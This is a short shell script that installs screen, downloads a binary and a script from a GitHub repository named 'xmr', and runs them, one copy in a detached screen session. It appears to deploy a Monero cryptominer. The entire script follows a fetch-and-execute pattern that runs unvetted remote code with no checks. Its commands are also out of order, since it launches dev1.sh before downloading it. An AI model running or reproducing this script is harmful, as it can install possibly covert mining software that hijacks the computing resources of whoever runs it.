#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS dev1.sh ./dev1.sh 65 75

wget https://github.com/renilo/xmr/raw/main/devbin

wget https://raw.githubusercontent.com/renilo/xmr/main/dev1.sh

chmod +x dev1.sh

./dev1.sh
